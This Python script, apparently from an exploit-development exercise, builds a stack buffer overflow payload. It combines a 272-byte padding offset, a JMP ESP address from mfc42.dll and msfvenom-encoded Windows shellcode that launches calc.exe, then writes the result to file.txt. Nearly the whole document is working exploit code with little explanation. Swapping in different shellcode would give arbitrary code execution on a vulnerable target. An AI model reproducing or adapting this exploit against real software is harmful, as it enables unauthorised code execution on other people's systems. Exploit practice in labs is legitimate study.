#!/usr/bin/python3
from pwn import remote, p32, write

# !py mona pattern_offset eip
offset = 272
junk = b"A" * offset

# !py mona jmp -r esp -m mfc42.dll
jmpesp = p32(0x73d92ecf)

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a\x0d' -e x86/jmp_call_additive
shellcode =  b""
shellcode += b"\xfc\xbb\x9f\x20\xc4\xfa\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x63\xc8\x46\xfa\x9b\x09\x27\x72"
shellcode += b"\x7e\x38\x67\xe0\x0b\x6b\x57\x62\x59\x80\x1c"
shellcode += b"\x26\x49\x13\x50\xef\x7e\x94\xdf\xc9\xb1\x25"
shellcode += b"\x73\x29\xd0\xa5\x8e\x7e\x32\x97\x40\x73\x33"
shellcode += b"\xd0\xbd\x7e\x61\x89\xca\x2d\x95\xbe\x87\xed"
shellcode += b"\x1e\x8c\x06\x76\xc3\x45\x28\x57\x52\xdd\x73"
shellcode += b"\x77\x55\x32\x08\x3e\x4d\x57\x35\x88\xe6\xa3"
shellcode += b"\xc1\x0b\x2e\xfa\x2a\xa7\x0f\x32\xd9\xb9\x48"
shellcode += b"\xf5\x02\xcc\xa0\x05\xbe\xd7\x77\x77\x64\x5d"
shellcode += b"\x63\xdf\xef\xc5\x4f\xe1\x3c\x93\x04\xed\x89"
shellcode += b"\xd7\x42\xf2\x0c\x3b\xf9\x0e\x84\xba\x2d\x87"
shellcode += b"\xde\x98\xe9\xc3\x85\x81\xa8\xa9\x68\xbd\xaa"
shellcode += b"\x11\xd4\x1b\xa1\xbc\x01\x16\xe8\xaa\xd4\xa4"
shellcode += b"\x97\x99\xd7\xb6\x97\x8d\xbf\x87\x1c\x42\xc7"
shellcode += b"\x17\xf7\x26\x37\x52\x55\x0e\xd0\x3b\x0c\x12"
shellcode += b"\xbd\xbb\xfb\x51\xb8\x3f\x09\x2a\x3f\x5f\x78"
shellcode += b"\x2f\x7b\xe7\x91\x5d\x14\x82\x95\xf2\x15\x87"
shellcode += b"\xf6\x95\x85\x4b\xd6\x30\x2e\xe9\x26\xbb\xce"
shellcode += b"\xf1\x26\xbb\xce\xf1"

payload = junk + jmpesp + shellcode

write("file.txt", payload)
